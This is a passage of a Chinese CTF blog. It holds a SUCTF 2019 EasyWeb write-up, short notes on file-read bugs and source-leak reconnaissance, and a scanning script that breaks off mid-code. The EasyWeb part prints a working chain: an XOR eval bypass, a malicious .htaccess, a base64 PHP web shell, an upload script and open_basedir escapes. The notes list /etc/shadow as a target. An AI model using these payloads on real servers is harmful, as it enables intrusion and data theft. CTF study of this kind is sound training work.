<h3 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>function get_the_flag()&#123;    <span class="comment">// webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#x27;<span class="meta">&lt;?</span>&#x27;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;, $hhh) )    die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>代码审计，通过符号_参数get传入内容，这里有个正则匹配，我们尝试异或进行绕过一下，前面的文章有介绍。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>

<p><img src="buu3/57.png"></p>
<p>成功绕过，看见版本号等等信息。</p>
<p>补充一下post提交的异或方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = (%9e ^ %ff).(%8c ^ %ff).(%8c ^ %ff).(%9a ^ %ff).(%8d ^ %ff).(%8b ^ %ff);\\assert$b = &quot;_&quot; . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;\\$b = $_POST$a($c[1]);</span><br></pre></td></tr></table></figure>

<p>本题不能使用post提交。</p>
<p>成功后我们尝试执行函数get_the_flag，目的应该是让我们上传文件，三个限制条件，</p>
<p>1、文件中内容没有&lt;?</p>
<p>2、使用函数exif_imagetype来判断是否为图片，这里我们一般使用GIF89A文件头绕过。</p>
<p>3、后缀名中不允许出现ph</p>
<p>是apache中间件，这里尝试上传.htaccess文件，如果上传.user.ini，还要求目录下有php文件。</p>
<p>这里需要特别注意，如果使用GIF89A文件头绕过，.htaccess文件无法生效，我们学习了一下，可以通过添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337#define height 1337</span><br></pre></td></tr></table></figure>

<p>#在.htaccess是注释符，所以.htaccess文件可以生效，</p>
<p>在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>x00x00x8ax39x8ax39 是wbmp文件的文件头<br>.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess</p>
<p>接下来是绕过&lt;?过滤，由于版本是php7.2，无法使用标签进行注入。</p>
<p>我们可以通过base64编码一句话，然后在.htaccess文件利用php伪协议进行解码，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337#define height 1337 AddType application/x-httpd-php .abcphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc&quot;</span><br></pre></td></tr></table></figure>

<p>shell.abc内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则,使用其他的文件头也是可以的</p>
<p>上脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsimport base64htaccess = b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application/x-httpd-php .abcphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc&quot;&quot;&quot;&quot;shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#x27;a&#x27;]);?&gt;&quot;)url = &quot;http://f6dac892-28e5-4eca-be9e-c88ab2549805.node3.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&quot;files = &#123;&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess,&#x27;image/jpeg&#x27;)&#125;data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;&#x27;file&#x27;:(&#x27;shell.abc&#x27;,shell,&#x27;image/jpeg&#x27;)&#125;response = requests.post(url=url, data=data, files=files)print(response.text)</span><br></pre></td></tr></table></figure>

<p>发现存在open_basedir和disable_functions的限制</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">bypass open_basedir</a></p>
<p>最后的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure>

<p>参考：<a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/12/17/5df803f62c08a/">https://www.dazhuanlan.com/2019/12/17/5df803f62c08a/</a></p>

      
    </div>

    
    
    
<div>
  
</div>
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/24/kali/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat.jpg">
      <meta itemprop="name" content="WJW">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WJW's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/24/kali/" class="post-title-link" itemprop="url">kali</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-24 15:09:40" itemprop="dateCreated datePublished" datetime="2021-04-24T15:09:40+08:00">2021-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-23 09:35:14" itemprop="dateModified" datetime="2021-05-23T09:35:14+08:00">2021-05-23</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>127</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>   <em><strong>其实安装失败的原因很简单，安装kali需要有网络配置，没有网络无法成功安装操作系统。</strong></em></p>
<p><em><strong>我没有网络的原因是DHCP服务没开启，去虚拟机看了一下虚拟网络的设置，都是打开着DHCP服务，最后解决办法是：</strong></em></p>
<p><em><strong>到任务管理器找到vm相关网络服务，都开启即可，完成网络配置。</strong></em></p>

      
    </div>

    
    
    
<div>
  
</div>
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/19/ctf%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat.jpg">
      <meta itemprop="name" content="WJW">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WJW's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/19/ctf%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">ctf之任意文件读取漏洞总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-19 20:45:02" itemprop="dateCreated datePublished" datetime="2021-04-19T20:45:02+08:00">2021-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-23 09:34:46" itemprop="dateModified" datetime="2021-05-23T09:34:46+08:00">2021-05-23</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>364</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>  ### 任意文件读取漏洞
</code></pre>
<h4 id="相关web语言"><a href="#相关web语言" class="headerlink" title="相关web语言"></a>相关web语言</h4><h5 id="1、php"><a href="#1、php" class="headerlink" title="1、php"></a>1、php</h5><p><em><strong>如</strong></em></p>
<p><em><strong>文件读取函数：</strong></em></p>
<p><em><strong>file_get_contents()、file()、fopen()、 fread()、 fgets()、 readline()等等</strong></em></p>
<p><em><strong>文件包含相关函数：</strong></em></p>
<p><em><strong>include、require、include_once、require_once</strong></em></p>
<p><em><strong>通过php读文件的执行系统命令：</strong></em></p>
<p><em><strong>system、exec</strong></em></p>
<p><em><strong>还有php伪协议读取文件</strong></em></p>
<h5 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h5><p><em><strong>如</strong></em></p>
<p><em><strong>os.path.join()函数</strong></em></p>
<h5 id="3、java"><a href="#3、java" class="headerlink" title="3、java"></a>3、java</h5><p><em><strong>FileInputStream函数、XXE导致的文件读取，java一些模块也支持file://协议，在CTF很常见。</strong></em></p>
<h5 id="4、Ruby"><a href="#4、Ruby" class="headerlink" title="4、Ruby"></a>4、Ruby</h5><p><em><strong>与Rails框架相关</strong></em></p>
<h5 id="5、Node"><a href="#5、Node" class="headerlink" title="5、Node"></a>5、Node</h5><p><em><strong>Node.js的express模块。</strong></em></p>
<h4 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h4><h4 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h4><p><em><strong>/etc/目录</strong></em></p>
<p><em><strong>/etc/passwd</strong></em></p>
<p><em><strong>/etc/shadow</strong></em></p>
<p><em><strong>等等</strong></em></p>

      
    </div>

    
    
    
<div>
  
</div>
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/18/ctf%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat.jpg">
      <meta itemprop="name" content="WJW">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WJW's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/18/ctf%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">ctf之信息收集总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-18 20:32:14" itemprop="dateCreated datePublished" datetime="2021-04-18T20:32:14+08:00">2021-04-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-23 09:34:34" itemprop="dateModified" datetime="2021-05-23T09:34:34+08:00">2021-05-23</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.8k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h2><h3 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h3><h4 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h4><h5 id="git常规泄露"><a href="#git常规泄露" class="headerlink" title="git常规泄露"></a>git常规泄露</h5><p>工具：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/denny0223/scrabble">https://github.com/denny0223/scrabble</a></p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scrabble url</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="git回滚"><a href="#git回滚" class="headerlink" title="git回滚"></a>git回滚</h5><p><em><strong>git作为一个版本控制工具，会记录每次提交(commit)的修改，存在git泄露时，flag可能在修改中被删除，可以使用<code>git reset</code></strong></em></p>
<p><em><strong>先得源码，后使用<code>git reset --hard HEAD^</code></strong></em></p>
<p><em><strong>命令跳到上一个版本。(HEAD表示当前版本，HEAD^表示上一个版本)</strong></em></p>
<p><em><strong>还可以使用<code>git log -stat</code></strong></em></p>
<p><em><strong>命令查看每一个commit修改了哪些文件，再用</strong></em></p>
<p><em><strong><code>git diff HEAD commit-id</code></strong></em></p>
<p><em><strong>比较在当前版本与想查看得commit之间的变化。</strong></em></p>
<h5 id="git分支"><a href="#git分支" class="headerlink" title="git分支"></a>git分支</h5><p><em><strong>每次提交时，git都会自动把它们串成一条时间线，这条就是一个分支。git允许使用多个分支，如果没有新建分支，那么只有一条时间线，默认master分支。</strong></em></p>
<p><em><strong>使用<code>git log</code></strong></em></p>
<p><em><strong>只能查看当前的分支修改，所以引入之前常用的GitHacker。</strong></em></p>
<p><em><strong>进入githack生成的文件夹，执行</strong></em></p>
<p><em><strong><code>git log --all</code>或</strong></em></p>
<p><em><strong><code>git branch -v</code></strong></em></p>
<p><em><strong>只能查看master分支，需要执行</strong></em></p>
<p><em><strong><code>git reflog</code></strong></em></p>
<p><em><strong>就能看见一些checkout的记录。</strong></em></p>
<p><em><strong>假如还有一个分支，我们需要手动下载这个分支的head信息，保存到</strong></em></p>
<p> <em><strong>.git/refs/heads/其他分支名</strong></em></p>
<p><em><strong>恢复heads信息后，我们使用GitHacker的部分代码，以实现自动恢复分支的效果。</strong></em></p>
<p><em><strong>使用的是： <a target="_blank" rel="noopener" href="https://github.com/WangYihang/GitHacker">https://github.com/WangYihang/GitHacker</a></strong></em></p>
<p><em><strong>在GitHacker的代码中，先下载ojbect文件，再使用git fsck检测，并继续下载缺失的文件。</strong></em></p>
<p><em><strong>修改代码如下：</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span></span><br><span class="line">	<span class="comment"># main()</span></span><br><span class="line">baseurl=complete_url(<span class="string">&#x27;http://127.0.0.1:8000/.git/&#x27;</span>)</span><br><span class="line">temppath=replace_bad_chars(get_prefix(baseurl))</span><br><span class="line">fixmissing(baseurl,temppath)</span><br></pre></td></tr></table></figure>

<p><em><strong>修改后运行，再次进入文件夹，执行</strong></em></p>
<p><em><strong><code>git log --all</code></strong></em></p>
<p><em><strong>或<code>git branch -v </code></strong></em></p>
<p><em><strong>即可恢复。</strong></em></p>
<p><em><strong>其他的利用：.git/config文件夹中可能含有access_token 信息，从而通过访问这个用户的其他仓库。</strong></em></p>
<h4 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h4><p><em><strong>SVN是源代码版本管理软件，造成SVN源代码漏洞主要原因是管理员操作不规范将SVN隐藏文件夹暴露于外网环境，可以利用.svn/entries或wc.db文件获得服务器源码，推荐使用两个工具：</strong></em></p>
<p><em><strong><a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></strong></em></p>
<p><em><strong>还有 Seay-svn</strong></em></p>
<h4 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h4><p><em><strong>.hg</strong></em></p>
<p><em><strong>工具：</strong></em></p>
<p><em><strong><a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></strong></em></p>
<p><em><strong>以上的源码泄露，可以直接使用目录扫描工具：</strong></em></p>
<p><em><strong><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></strong></em></p>
<p><em><strong>有可能存在重定向一类问题，访问.git返回403，访问.git/config，如果有文件返回，说明存在.git泄露。</strong></em></p>
<p><em><strong>在SVN泄露，一般是在entries中爬取源代码，但有时为空，注意wc.db文件存在与否，便可通过其中的checksum在pristine文件夹中获取源代码。</strong></em></p>
<h3 id="敏感备份文件"><a href="#敏感备份文件" class="headerlink" title="敏感备份文件"></a>敏感备份文件</h3><h4 id="1、gedit备份文件"><a href="#1、gedit备份文件" class="headerlink" title="1、gedit备份文件"></a>1、gedit备份文件</h4><p><em><strong>在Linux下，用gedit编辑器保存后，当前目录会生成一个后缀为“<del>”的文件，访问带有</del>的文件，得到flag。</strong></em></p>
<h4 id="2、vim备份文件"><a href="#2、vim备份文件" class="headerlink" title="2、vim备份文件"></a>2、vim备份文件</h4><p><em><strong>vim是当前linux运行最多的linux编辑器，如果遇到卡死意外退出，会生成一个备份文件，</strong></em></p>
<p><em><strong>.flag.swp</strong></em></p>
<p><em><strong>使用命令 <code>vim -r</code></strong></em></p>
<p><em><strong>恢复文件内容，要先生成flag文件，再恢复文件。</strong></em></p>
<p><em><strong><code>vim flag</code></strong></em></p>
<p><em><strong><code>vim -r flag</code></strong></em></p>
<h4 id="3、常规文件"><a href="#3、常规文件" class="headerlink" title="3、常规文件"></a>3、常规文件</h4><p><em><strong>robots.txt:记录一些目录和CMS版本信息。</strong></em></p>
<p><em><strong>readme.txt:记录CMS版本信息，甚至有Github地址。</strong></em></p>
<p><em><strong><a target="_blank" rel="noopener" href="http://www.zip/rar/tar.gz:%E5%BE%80%E5%BE%80%E6%98%AF%E7%BD%91%E7%AB%99%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD">www.zip/rar/tar.gz:往往是网站的源码备份</a></strong></em></p>
<p><em><strong>以上特殊的关键字，我们可以构造成一个字典，后续用burp进行爆破。</strong></em></p>
<h3 id="Banner识别"><a href="#Banner识别" class="headerlink" title="Banner识别"></a>Banner识别</h3><p>Banner信息：服务器对外显示的一些基础信息</p>
<p>1、自行收集指纹库</p>
<p>github上有大量成型且公开的CMS指纹库，借鉴一些成型扫描器对网站进行识别。</p>
<p>2、使用已有工具</p>
<p><strong>Wappalyzer工具</strong></p>
<p>除了使用工具，还可以随意输入一些参数，可能会出现404或302跳转出一些信息。</p>

      
    </div>

    
    
    
<div>
  
</div>
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/07/buu2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat.jpg">
      <meta itemprop="name" content="WJW">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WJW's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/07/buu2/" class="post-title-link" itemprop="url">buu2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-07 20:10:08" itemprop="dateCreated datePublished" datetime="2021-04-07T20:10:08+08:00">2021-04-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-22 16:09:29" itemprop="dateModified" datetime="2021-07-22T16:09:29+08:00">2021-07-22</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>45k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>下载源码，解压一下，那么多php文件，怎么看的过来，感觉应该要用脚本处理了。</p>
<p>写脚本能力还不行，这里应该是设计了一句话木马，看一下wp。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115256974">这里就参考大佬的脚本</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))   <span class="comment">#只是一个简单的时间函数，看起来更漂亮罢了</span></span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)                               <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/phpstudy_pro/WWW/test1/&quot;</span></span><br><span class="line">os.chdir(filePath)                                     <span class="comment">#改变当前的路径，这个还是不太懂</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                       <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)                                            <span class="comment">#得到该目录下所有文件的名称</span></span><br><span class="line">session = requests.Session()                                        <span class="comment">#得到session()为之后的实现代码回显得取创造条件</span></span><br><span class="line">session.keep_alive = <span class="literal">False</span>                                <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()                                                       <span class="comment">#好像与锁什么的相关，但是还是不太懂，多线程开启</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))  <span class="comment">#更好看，同时可以对比不加线程和加线程的时间对比</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                   <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;                                         <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;                                           <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/test1/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)        <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()                                     <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:                            <span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()                                     <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()                                     <span class="comment"># 